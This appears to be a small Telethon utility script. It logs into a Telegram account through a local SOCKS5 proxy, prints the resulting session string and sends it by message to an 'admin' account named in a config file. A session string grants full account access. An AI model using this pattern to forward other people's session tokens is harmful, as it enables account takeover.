from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import json
import python_socks

with open('config.json') as f:
    data = json.load(f)
    api_id = data['api_id']
    api_hash = data['api_hash']
    version = data['version']
    admin = data['admin']


client = TelegramClient(
    StringSession(),
    api_id,
    api_hash,
    device_model=f"All-In-One V{version}",
    proxy=(python_socks.ProxyType.SOCKS5, '127.0.0.1', 10808)
)
with client:
    session = client.session.save()
    print(session)
    client.start()
    client.send_message(admin, session)
